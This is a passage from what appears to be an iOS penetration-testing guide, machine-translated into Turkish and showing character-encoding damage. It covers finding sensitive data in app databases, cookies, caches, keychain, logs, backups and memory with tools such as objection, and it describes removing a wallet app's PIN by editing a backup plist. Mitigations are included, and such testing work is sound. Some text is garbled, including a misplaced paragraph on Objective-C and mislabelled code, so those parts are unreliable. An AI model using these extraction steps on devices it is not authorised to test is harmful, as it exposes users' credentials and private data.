[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple\_ref/doc/uid/TP40001075-CH8-SW1), uygulamanÄ±zÄ±n model katmanÄ±nÄ± yÃ¶netmek iÃ§in bir Ã§erÃ§evedir. Core Data, kalÄ±cÄ± depolama olarak SQLite'yi kullanabilir, ancak Ã§erÃ§eve kendisi bir veritabanÄ± deÄŸildir.\
CoreData, varsayÄ±lan olarak verilerini ÅŸifrelemez. Bununla birlikte, CoreData'ye ek bir ÅŸifreleme katmanÄ± ekleyebilirsiniz. Daha fazla ayrÄ±ntÄ± iÃ§in [GitHub Repo](https://github.com/project-imas/encrypted-core-data)'ya bakÄ±n.

Bir uygulamanÄ±n SQLite Core Data bilgilerini `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support` yolunda bulabilirsiniz.

**EÄŸer SQLite'yi aÃ§abilir ve hassas bilgilere eriÅŸebilirseniz, bir yapÄ±landÄ±rma hatasÄ± buldunuz demektir.**

{% code title="iGoat'tan Kod" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase), SQLite Ã¼zerine inÅŸa edilmiÅŸ bir anahtar/deÄŸer deposudur.\
Yap veritabanlarÄ± sqlite veritabanlarÄ± olduÄŸu iÃ§in, Ã¶nceki bÃ¶lÃ¼mde Ã¶nerilen komutu kullanarak onlarÄ± bulabilirsiniz.

### DiÄŸer SQLite VeritabanlarÄ±

UygulamalarÄ±n kendi sqlite veritabanlarÄ±nÄ± oluÅŸturmasÄ± yaygÄ±ndÄ±r. Bu veritabanlarÄ±nda **hassas** **veriler** saklanabilir ve ÅŸifrelenmeden bÄ±rakÄ±labilir. Bu nedenle, her uygulama dizinindeki her veritabanÄ±nÄ± kontrol etmek her zaman ilginÃ§ olabilir. Bu nedenle, verilerin kaydedildiÄŸi uygulama dizinine gidin (`/private/var/mobile/Containers/Data/Application/{APPID}`)
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Firebase GerÃ§ek ZamanlÄ± VeritabanlarÄ±

GeliÅŸtiricilere Firebase GerÃ§ek ZamanlÄ± VeritabanlarÄ± aracÄ±lÄ±ÄŸÄ±yla bir NoSQL bulut barÄ±ndÄ±rÄ±lan veritabanÄ±nda veri depolama ve senkronizasyonu imkanÄ± sunulmaktadÄ±r. Veri JSON formatÄ±nda depolanÄ±r ve gerÃ§ek zamanlÄ± olarak tÃ¼m baÄŸlÄ± istemcilere senkronize edilir.

Firebase veritabanlarÄ±nÄ±n yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ olup olmadÄ±ÄŸÄ±nÄ± nasÄ±l kontrol edeceÄŸinizi burada bulabilirsiniz:

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Realm veritabanlarÄ±

[Realm Objective-C](https://realm.io/docs/objc/latest/) ve [Realm Swift](https://realm.io/docs/swift/latest/) Apple tarafÄ±ndan saÄŸlanmayan gÃ¼Ã§lÃ¼ bir veri depolama alternatifi sunar. VarsayÄ±lan olarak, veriler ÅŸifrelenmemiÅŸ olarak depolanÄ±r ve ÅŸifreleme belirli yapÄ±landÄ±rmalar aracÄ±lÄ±ÄŸÄ±yla saÄŸlanÄ±r.

VeritabanlarÄ± `/private/var/mobile/Containers/Data/Application/{APPID}` konumunda bulunur. Bu dosyalarÄ± keÅŸfetmek iÃ§in aÅŸaÄŸÄ±daki gibi komutlar kullanÄ±labilir:
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Bu veritabanÄ± dosyalarÄ±nÄ± gÃ¶rÃ¼ntÃ¼lemek iÃ§in [**Realm Studio**](https://github.com/realm/realm-studio) aracÄ± Ã¶nerilir.

Bir Realm veritabanÄ± iÃ§inde ÅŸifreleme uygulamak iÃ§in aÅŸaÄŸÄ±daki kod parÃ§acÄ±ÄŸÄ± kullanÄ±labilir:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Couchbase Lite VeritabanlarÄ±

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios), **hafif** ve **yerleÅŸik** bir veritabanÄ± motoru olarak tanÄ±mlanÄ±r ve **belge odaklÄ±** (NoSQL) yaklaÅŸÄ±mÄ± izler. **iOS** ve **macOS** iÃ§in yerel olarak tasarlanmÄ±ÅŸ olup, verilerin sorunsuz bir ÅŸekilde senkronize edilmesini saÄŸlar.

Bir cihazda potansiyel Couchbase veritabanlarÄ±nÄ± belirlemek iÃ§in aÅŸaÄŸÄ±daki dizin incelenmelidir:
```bash
ls /private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/
```
### Ã‡erezler

iOS, uygulamalarÄ±n Ã§erezlerini her uygulamanÄ±n klasÃ¶rÃ¼ iÃ§indeki **`Library/Cookies/cookies.binarycookies`** dosyasÄ±nda saklar. Bununla birlikte, geliÅŸtiriciler bazen bu Ã§erezleri **anahtarlÄ±kta** saklamayÄ± tercih eder, Ã§Ã¼nkÃ¼ bahsi geÃ§en **Ã§erez dosyasÄ±na yedeklerden eriÅŸilebilir**.

Ã‡erez dosyasÄ±nÄ± incelemek iÃ§in [**bu python betiÄŸini**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) kullanabilir veya objection'Ä±n **`ios cookies get`** komutunu kullanabilirsiniz.\
Bu dosyalarÄ± JSON formatÄ±na dÃ¶nÃ¼ÅŸtÃ¼rmek ve verileri incelemek iÃ§in objection'Ä± da kullanabilirsiniz.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### Ã–nbellek

NSURLSession varsayÄ±lan olarak **HTTP isteklerini ve yanÄ±tlarÄ±nÄ± Cache.db veritabanÄ±nda** saklar. Bu veritabanÄ±, eÄŸer tokenlar, kullanÄ±cÄ± adlarÄ± veya baÅŸka hassas bilgiler Ã¶nbelleÄŸe alÄ±ndÄ±ysa, **hassas verileri** iÃ§erebilir. Ã–nbelleÄŸe alÄ±nmÄ±ÅŸ bilgileri bulmak iÃ§in uygulamanÄ±n veri dizinini (`/var/mobile/Containers/Data/Application/<UUID>`) aÃ§Ä±n ve `/Library/Caches/<Bundle Identifier>` dizinine gidin. **WebKit Ã¶nbelleÄŸi de Cache.db dosyasÄ±nda saklanÄ±r**. **Objection**, bu veritabanÄ±nÄ± `sqlite connect Cache.db` komutuyla aÃ§abilir ve etkileÅŸimde bulunabilir, Ã§Ã¼nkÃ¼ bu normal bir SQLite veritabanÄ±dÄ±r.

Ä°stek veya yanÄ±tta hassas bilgiler bulunabileceÄŸinden, bu verilerin **Ã¶nbelleÄŸe alÄ±nmamasÄ± Ã¶nerilir**. AÅŸaÄŸÄ±daki liste, bunu baÅŸarmanÄ±n farklÄ± yollarÄ±nÄ± gÃ¶stermektedir:

1. Oturum kapatÄ±ldÄ±ktan sonra Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ yanÄ±tlarÄ±n kaldÄ±rÄ±lmasÄ± Ã¶nerilir. Apple tarafÄ±ndan saÄŸlanan [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses) adlÄ± yÃ¶ntemle bunu yapabilirsiniz. Bu yÃ¶ntemi aÅŸaÄŸÄ±daki gibi Ã§aÄŸÄ±rabilirsiniz:

   `URLCache.shared.removeAllCachedResponses()`

   Bu yÃ¶ntem, Cache.db dosyasÄ±ndaki tÃ¼m Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ istekleri ve yanÄ±tlarÄ± kaldÄ±racaktÄ±r.
2. Ã‡erezlerin avantajÄ±nÄ± kullanmanÄ±z gerekmiyorsa, URLSession'Ä±n [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) yapÄ±landÄ±rma Ã¶zelliÄŸini kullanmanÄ±z Ã¶nerilir. Bu, Ã§erezleri ve Ã¶nbelleÄŸi kaydetmeyi devre dÄ±ÅŸÄ± bÄ±rakacaktÄ±r.

   [Apple belgeleri](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

   `Bir geÃ§ici oturum yapÄ±landÄ±rma nesnesi, varsayÄ±lan bir oturum yapÄ±landÄ±rmasÄ±yla (bkz. default) benzerdir, ancak karÅŸÄ±lÄ±k gelen oturum nesnesi Ã¶nbellekleri, kimlik bilgisi depolarÄ±nÄ± veya herhangi bir oturumla ilgili veriyi diske kaydetmez. Bunun yerine, oturumla ilgili veriler RAM'de saklanÄ±r. Bir geÃ§ici oturumun veri yazdÄ±ÄŸÄ± tek zaman, bir URL'nin iÃ§eriÄŸini bir dosyaya yazmasÄ±nÄ± sÃ¶ylediÄŸiniz zamandÄ±r.`
3. Ã–nbellek, [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed) Ã¶nbellek politikasÄ±na ayarlanarak da devre dÄ±ÅŸÄ± bÄ±rakÄ±labilir. Bu, Ã¶nbelleÄŸin bellekte veya diske herhangi bir ÅŸekilde saklanmasÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakacaktÄ±r.

### Ekran GÃ¶rÃ¼ntÃ¼leri

Ana ekran dÃ¼ÄŸmesine bastÄ±ÄŸÄ±nÄ±zda, iOS, uygulamaya Ã§ok daha yumuÅŸak bir ÅŸekilde geÃ§iÅŸ yapabilmek iÃ§in mevcut ekranÄ±n bir gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r. Ancak, mevcut ekranda **hassas veriler** bulunuyorsa, bu veriler **resimde kaydedilir** (ki bu **yeniden baÅŸlatmalara kadar** **saklanÄ±r**). Bu, uygulamalar arasÄ±nda geÃ§iÅŸ yapmak iÃ§in ana ekranÄ± Ã§ift tÄ±kladÄ±ÄŸÄ±nÄ±zda eriÅŸebileceÄŸiniz ekran gÃ¶rÃ¼ntÃ¼leridir.

iPhone jailbreak yapÄ±lmamÄ±ÅŸsa, **saldÄ±rganÄ±n** bu ekran gÃ¶rÃ¼ntÃ¼lerini gÃ¶rebilmek iÃ§in **cihaza eriÅŸime** **ihtiyacÄ±** **vardÄ±r**. VarsayÄ±lan olarak, son ekran gÃ¶rÃ¼ntÃ¼sÃ¼ uygulamanÄ±n sandbox'Ä±nda `Library/Caches/Snapshots/` veya `Library/SplashBoard/Snapshots` klasÃ¶rÃ¼nde saklanÄ±r (gÃ¼venilir bilgisayarlar, iOX 7.0'dan itibaren dosya sistemine eriÅŸemez).

Bu kÃ¶tÃ¼ davranÄ±ÅŸÄ± Ã¶nlemenin bir yolu, `ApplicationDidEnterBackground()` iÅŸlevini kullanarak ekran gÃ¶rÃ¼ntÃ¼sÃ¼ almadan Ã¶nce boÅŸ bir ekran veya hassas verileri kaldÄ±rmaktÄ±r.

AÅŸaÄŸÄ±daki Ã¶rnek dÃ¼zeltme yÃ¶ntemi, varsayÄ±lan bir ekran gÃ¶rÃ¼ntÃ¼sÃ¼ ayarlayacaktÄ±r.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
Objective-C:

Objective-C, Apple tarafÄ±ndan geliÅŸtirilen bir programlama dilidir. iOS uygulama geliÅŸtirme sÃ¼recinde sÄ±kÃ§a kullanÄ±lÄ±r. Objective-C, C programlama diline dayanÄ±r ve Smalltalk dilinden etkilenmiÅŸtir.

Objective-C, iOS uygulamalarÄ±nÄ±n gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmek iÃ§in kullanÄ±lan bir dildir. Bu nedenle, iOS pentesting sÃ¼recinde Objective-C'ye aÅŸina olmak Ã¶nemlidir.

Objective-C ile iOS uygulamalarÄ±nÄ± analiz etmek iÃ§in birkaÃ§ araÃ§ bulunmaktadÄ±r. Bunlar arasÄ±nda Hopper Disassembler, class-dump, Cycript ve Frida gibi araÃ§lar bulunur.

Objective-C, iOS uygulamalarÄ±nÄ±n kaynak kodunu anlamak ve analiz etmek iÃ§in kullanÄ±lan bir dil olduÄŸu iÃ§in, Objective-C'ye hakim olmak, iOS pentesting sÃ¼recinde bÃ¼yÃ¼k bir avantaj saÄŸlar.
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
Bu, uygulama arka plana alÄ±ndÄ±ÄŸÄ±nda arka plan gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ `overlayImage.png` olarak ayarlar. `overlayImage.png` her zaman mevcut gÃ¶rÃ¼nÃ¼mÃ¼ geÃ§ersiz kÄ±ldÄ±ÄŸÄ± iÃ§in hassas veri sÄ±zÄ±ntÄ±larÄ±nÄ± Ã¶nler.

### Anahtar Zinciri

iOS anahtar zincirine eriÅŸmek ve yÃ¶netmek iÃ§in, jailbreakli cihazlar iÃ§in uygun olan [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper) gibi araÃ§lar mevcuttur. AyrÄ±ca, benzer amaÃ§lar iÃ§in [**Objection**](https://github.com/sensepost/objection) `ios keychain dump` komutunu saÄŸlar.

#### **Kimlik Bilgilerini Saklama**

**NSURLCredential** sÄ±nÄ±fÄ±, hassas bilgileri doÄŸrudan anahtar zincirine kaydetmek iÃ§in idealdir ve NSUserDefaults veya diÄŸer sarmalayÄ±cÄ±lar iÃ§in ihtiyacÄ± ortadan kaldÄ±rÄ±r. GiriÅŸ yaptÄ±ktan sonra kimlik bilgilerini saklamak iÃ§in aÅŸaÄŸÄ±daki Swift kodu kullanÄ±lÄ±r:
```swift
NSURLCredential *credential;
credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Bu saklanan kimlik bilgilerini Ã§Ä±karmak iÃ§in Objection'Ä±n `ios nsurlcredentialstorage dump` komutu kullanÄ±lÄ±r.

## **Ã–zel Klavyeler ve Klavye Ã–nbelleÄŸi**

iOS 8.0'dan itibaren kullanÄ±cÄ±lar, **Ayarlar > Genel > Klavye > Klavyeler** altÄ±nda yÃ¶netilebilen Ã¶zel klavye uzantÄ±larÄ± yÃ¼kleyebilirler. Bu klavyeler geniÅŸletilmiÅŸ iÅŸlevsellik sunarken, tuÅŸ vuruÅŸu kaydetme ve verileri harici sunuculara iletmek gibi bir risk oluÅŸtururlar, ancak kullanÄ±cÄ±lara aÄŸ eriÅŸimi gerektiren klavyeler hakkÄ±nda bilgi verilir. Uygulamalar, hassas bilgi giriÅŸi iÃ§in Ã¶zel klavyelerin kullanÄ±mÄ±nÄ± kÄ±sÄ±tlayabilir ve bunu yapmalÄ±dÄ±r.

**GÃ¼venlik Ã–nerileri:**
- GeliÅŸmiÅŸ gÃ¼venlik iÃ§in Ã¼Ã§Ã¼ncÃ¼ taraf klavyelerin devre dÄ±ÅŸÄ± bÄ±rakÄ±lmasÄ± Ã¶nerilir.
- Ã–ntanÄ±mlÄ± iOS klavyesinin otomatik dÃ¼zeltme ve otomatik Ã¶neri Ã¶zelliklerine dikkat edilmelidir, Ã§Ã¼nkÃ¼ bu Ã¶zellikler hassas bilgileri `Library/Keyboard/{locale}-dynamic-text.dat` veya `/private/var/mobile/Library/Keyboard/dynamic-text.dat` konumunda bulunan Ã¶nbellek dosyalarÄ±na kaydedebilir. Bu Ã¶nbellek dosyalarÄ± dÃ¼zenli olarak hassas veriler iÃ§in kontrol edilmelidir. Ã–nbelleÄŸe alÄ±nmÄ±ÅŸ verileri temizlemek iÃ§in **Ayarlar > Genel > SÄ±fÄ±rla > Klavye SÃ¶zlÃ¼ÄŸÃ¼nÃ¼ SÄ±fÄ±rla** seÃ§eneÄŸi Ã¶nerilir.
- AÄŸ trafiÄŸinin dinlenmesi, Ã¶zel bir klavyenin tuÅŸ vuruÅŸlarÄ±nÄ± uzaktan iletip iletemediÄŸini ortaya Ã§Ä±karabilir.

### **Metin AlanÄ± Ã–nbelleÄŸini Ã–nleme**

[UITextInputTraits protokolÃ¼](https://developer.apple.com/reference/uikit/uitextinputtraits), otomatik dÃ¼zeltme ve gÃ¼venli metin giriÅŸi gibi hassas bilgi Ã¶nbelleÄŸini Ã¶nlemek iÃ§in gerekli olan Ã¶zellikleri sunar. Ã–rneÄŸin, otomatik dÃ¼zeltmeyi devre dÄ±ÅŸÄ± bÄ±rakmak ve gÃ¼venli metin giriÅŸini etkinleÅŸtirmek ÅŸu ÅŸekilde yapÄ±labilir:
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
AyrÄ±ca, geliÅŸtiriciler metin alanlarÄ±nÄ±n, Ã¶zellikle ÅŸifreler ve PIN'ler gibi hassas bilgilerin girildiÄŸi alanlarÄ±n Ã¶nbelleÄŸe alÄ±nmasÄ±nÄ± engellemek iÃ§in `autocorrectionType`'Ä± `UITextAutocorrectionTypeNo` ve `secureTextEntry`'yi `YES` olarak ayarlayarak Ã¶nbelleÄŸe alma iÅŸlemini devre dÄ±ÅŸÄ± bÄ±rakmalÄ±dÄ±r.
```objectivec
UITextField *textField = [[UITextField alloc] initWithFrame:frame];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **KayÄ±tlar**

Hata ayÄ±klama kodu genellikle **kayÄ±tlarÄ±n kullanÄ±mÄ±nÄ±** iÃ§erir. **KayÄ±tlar hassas bilgiler iÃ§erebilir** riski vardÄ±r. Daha Ã¶nce, iOS 6 ve daha eski sÃ¼rÃ¼mlerde, kayÄ±tlar tÃ¼m uygulamalara eriÅŸilebilirken, hassas veri sÄ±zÄ±ntÄ±sÄ± riski oluÅŸturuyordu. **Åimdi, uygulamalar yalnÄ±zca kendi kayÄ±tlarÄ±na eriÅŸebilirler**.

Bu kÄ±sÄ±tlamalara raÄŸmen, kilidini aÃ§mÄ±ÅŸ bir cihaza fiziksel eriÅŸimi olan bir **saldÄ±rgan, cihazÄ± bir bilgisayara baÄŸlayarak kayÄ±tlarÄ± okuyabilir**. KayÄ±tlarÄ±n uygulamanÄ±n kaldÄ±rÄ±lmasÄ±ndan sonra bile diske kaydedildiÄŸini unutmamak Ã¶nemlidir.

Riskleri azaltmak iÃ§in, uygulama ile **etkileÅŸimde bulunmak**, tÃ¼m iÅŸlevlerini ve giriÅŸlerini keÅŸfetmek, yanlÄ±ÅŸlÄ±kla hassas bilgilerin kaydedilmediÄŸinden emin olmak iÃ§in Ã¶nerilir.

Potansiyel sÄ±zÄ±ntÄ±lar iÃ§in uygulamanÄ±n kaynak kodunu inceleyerek, `NSLog`, `NSAssert`, `NSCAssert`, `fprintf` gibi anahtar kelimeleri kullanarak hem **Ã¶nceden tanÄ±mlanmÄ±ÅŸ** hem de **Ã¶zel kayÄ±t ifadelerini** arayÄ±n. Dahili iÅŸlevler iÃ§in ve Ã¶zel uygulamalar iÃ§in `Logging` veya `Logfile` gibi herhangi bir bahsetme iÃ§in arama yapÄ±n.

### **Sistem KayÄ±tlarÄ±nÄ± Ä°zleme**

Uygulamalar, hassas olabilen Ã§eÅŸitli bilgileri kaydeder. Bu kayÄ±tlarÄ± izlemek iÃ§in, aÅŸaÄŸÄ±daki gibi araÃ§lar ve komutlar kullanÄ±labilir:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To capture the device logs
```
AÅŸaÄŸÄ±daki adÄ±mlar, **Xcode** kullanarak konsol gÃ¼nlÃ¼klerini toplamanÄ±n bir yolunu saÄŸlar:

1. Xcode'u aÃ§Ä±n.
2. iOS cihazÄ±nÄ± baÄŸlayÄ±n.
3. **Pencere** -> **Cihazlar ve SimÃ¼latÃ¶rler**'e gidin.
4. CihazÄ±nÄ±zÄ± seÃ§in.
5. Ä°ncelemekte olduÄŸunuz sorunu tetikleyin.
6. GÃ¼nlÃ¼kleri yeni bir pencerede gÃ¶rÃ¼ntÃ¼lemek iÃ§in **Konsolu AÃ§** dÃ¼ÄŸmesini kullanÄ±n.

Daha geliÅŸmiÅŸ gÃ¼nlÃ¼kleme iÃ§in, cihaz kabuÄŸuna baÄŸlanmak ve **socat** kullanarak gerÃ§ek zamanlÄ± gÃ¼nlÃ¼k izleme saÄŸlamak mÃ¼mkÃ¼ndÃ¼r:
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock
```
KomutlarÄ± izleyerek gÃ¼nlÃ¼k etkinlikleri gÃ¶zlemlemek, sorunlarÄ± teÅŸhis etmek veya gÃ¼nlÃ¼klerde potansiyel veri sÄ±zÄ±ntÄ±larÄ±nÄ± belirlemek iÃ§in son derece deÄŸerli olabilir.

***

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturun ve otomatikleÅŸtirin**.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Yedeklemeler

iOS'a **otomatik yedekleme Ã¶zellikleri** entegre edilmiÅŸtir ve iTunes (macOS Catalina'ya kadar), Finder (macOS Catalina'dan itibaren) veya iCloud aracÄ±lÄ±ÄŸÄ±yla cihaz verilerinin kopyalarÄ±nÄ±n oluÅŸturulmasÄ±nÄ± kolaylaÅŸtÄ±rÄ±r. Bu yedeklemeler neredeyse tÃ¼m cihaz verilerini kapsar, ancak Apple Pay ayrÄ±ntÄ±larÄ± ve Touch ID yapÄ±landÄ±rmalarÄ± gibi son derece hassas unsurlarÄ± iÃ§ermez.

### GÃ¼venlik Riskleri

Yedeklemelerde **kurulu uygulamalar ve verileri** yer almasÄ±, potansiyel **veri sÄ±zÄ±ntÄ±sÄ±** sorununu ve **yedekleme deÄŸiÅŸikliklerinin uygulama iÅŸlevselliÄŸini deÄŸiÅŸtirebileceÄŸi riskini** ortaya Ã§Ä±karÄ±r. Bu riskleri azaltmak iÃ§in hassas bilgileri dÃ¼z metin olarak herhangi bir uygulamanÄ±n dizininde veya alt dizinlerinde saklamamak Ã¶nerilir.

### Yedeklemelerden DosyalarÄ± HariÃ§ Tutma

`Documents/` ve `Library/Application Support/` iÃ§indeki dosyalar varsayÄ±lan olarak yedeklenir. GeliÅŸtiriciler, `NSURLIsExcludedFromBackupKey` ile `NSURL setResourceValue:forKey:error:` kullanarak belirli dosyalarÄ± veya dizinleri yedeklemelerden hariÃ§ tutabilir. Hassas verilerin yedeklemelere dahil edilmesini Ã¶nlemek iÃ§in bu uygulama Ã¶nemlidir.

### Zafiyetlerin Test Edilmesi

Bir uygulamanÄ±n yedekleme gÃ¼venliÄŸini deÄŸerlendirmek iÃ§in, Finder kullanarak bir yedekleme oluÅŸturarak baÅŸlayÄ±n ve ardÄ±ndan [Apple'Ä±n resmi belgelerinden](https://support.apple.com/en-us/HT204215) rehberlik alarak yedeklemeyi bulun. Yedeklemeyi, uygulama davranÄ±ÅŸÄ±nÄ± etkileyebilecek hassas verileri veya yapÄ±landÄ±rmalarÄ± deÄŸiÅŸtirebilecek unsurlar aÃ§Ä±sÄ±ndan analiz edin.

Hassas bilgiler, komut satÄ±rÄ± araÃ§larÄ± veya [iMazing](https://imazing.com) gibi uygulamalar kullanÄ±larak aranabilir. Åifreli yedeklemeler iÃ§in, ÅŸifrelemenin varlÄ±ÄŸÄ±, yedeklemenin kÃ¶kÃ¼nde bulunan "Manifest.plist" dosyasÄ±ndaki "IsEncrypted" anahtarÄ±nÄ±n kontrol edilerek doÄŸrulanabilir.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
ÅifrelenmiÅŸ yedeklemelerle uÄŸraÅŸmak iÃ§in, **backup_tool.py** ve **backup_passwd.py** gibi Python betikleri [DinoSec'in GitHub deposunda](https://github.com/dinosec/iphone-dataprotection/tree/master/python_scripts) bulunabilir. Bunlar, en son iTunes/Finder sÃ¼rÃ¼mleriyle uyumluluk iÃ§in ayarlamalar gerektirebilir. Åifre korumalÄ± yedeklemelerdeki dosyalara eriÅŸmek iÃ§in baÅŸka bir seÃ§enek ise [**iOSbackup** aracÄ±](https://pypi.org/project/iOSbackup/)dir.

### Uygulama DavranÄ±ÅŸÄ±nÄ± DeÄŸiÅŸtirme

Yedekleme deÄŸiÅŸiklikleri aracÄ±lÄ±ÄŸÄ±yla uygulama davranÄ±ÅŸÄ±nÄ± deÄŸiÅŸtirme Ã¶rneÄŸi, [Bither bitcoin cÃ¼zdan uygulamasÄ±nda](https://github.com/bither/bither-ios) gÃ¶sterilmektedir. UI kilidi PIN'i, **pin_code** anahtarÄ± altÄ±nda `net.bither.plist` iÃ§inde saklanÄ±r. Bu anahtarÄ± plist dosyasÄ±ndan kaldÄ±rarak ve yedeklemeyi geri yÃ¼kleyerek PIN gereksinimini kaldÄ±rabilir ve sÄ±nÄ±rsÄ±z eriÅŸim saÄŸlayabilirsiniz.

## Hassas Veriler Ä°Ã§in Bellek Testi Ã–zeti

Bir uygulamanÄ±n belleÄŸinde depolanan hassas bilgilerle uÄŸraÅŸÄ±rken, bu verilerin maruz kalma sÃ¼resini sÄ±nÄ±rlamak son derece Ã¶nemlidir. Bellek iÃ§eriÄŸini araÅŸtÄ±rmak iÃ§in iki temel yaklaÅŸÄ±m vardÄ±r: **bellek dÃ¶kÃ¼mÃ¼ oluÅŸturma** ve **belleÄŸi gerÃ§ek zamanlÄ± olarak analiz etme**. Her iki yÃ¶ntemin de, dÃ¶kÃ¼m sÃ¼reci veya analiz sÄ±rasÄ±nda Ã¶nemli verilerin gÃ¶zden kaÃ§ma potansiyeli gibi zorluklarÄ± vardÄ±r.

## **Bellek DÃ¶kÃ¼mÃ¼ Almak ve Analiz Etmek**

Hem jailbreak yapÄ±lmÄ±ÅŸ hem de yapÄ±lmamÄ±ÅŸ cihazlar iÃ§in, [objection](https://github.com/sensepost/objection) ve [Fridump](https://github.com/Nightbringer21/fridump) gibi araÃ§lar bir uygulamanÄ±n iÅŸlem belleÄŸini dÃ¶kme imkanÄ± saÄŸlar. DÃ¶kÃ¼len verileri analiz etmek iÃ§in ise aradÄ±ÄŸÄ±nÄ±z bilginin doÄŸasÄ±na baÄŸlÄ± olarak Ã§eÅŸitli araÃ§lar kullanÄ±lÄ±r.

Bir bellek dÃ¶kÃ¼mÃ¼nden dizeleri Ã§Ä±karmak iÃ§in `strings` veya `rabin2 -zz` gibi komutlar kullanÄ±labilir:
```bash
# Extracting strings using strings command
$ strings memory > strings.txt

# Extracting strings using rabin2
$ rabin2 -ZZ memory > strings.txt
```
Daha ayrÄ±ntÄ±lÄ± bir analiz iÃ§in, belirli veri tÃ¼rlerini veya desenleri aramak iÃ§in **radare2**, kapsamlÄ± arama yetenekleri sunar:
```bash
$ r2 <name_of_your_dump_file>
[0x00000000]> /?
...
```
## **Ã‡alÄ±ÅŸma ZamanÄ± Bellek Analizi**

**r2frida**, bir uygulamanÄ±n belleÄŸini bir bellek dÃ¶kÃ¼mÃ¼ne ihtiyaÃ§ duymadan gerÃ§ek zamanlÄ± olarak incelemek iÃ§in gÃ¼Ã§lÃ¼ bir alternatif sunar. Bu araÃ§, Ã§alÄ±ÅŸan uygulamanÄ±n belleÄŸinde arama komutlarÄ±nÄ±n doÄŸrudan yÃ¼rÃ¼tÃ¼lmesini saÄŸlar:
```bash
$ r2 frida://usb//<name_of_your_app>
[0x00000000]> /\ <search_command>
```
## KÄ±rÄ±k Åifreleme

### ZayÄ±f Anahtar YÃ¶netimi SÃ¼reÃ§leri

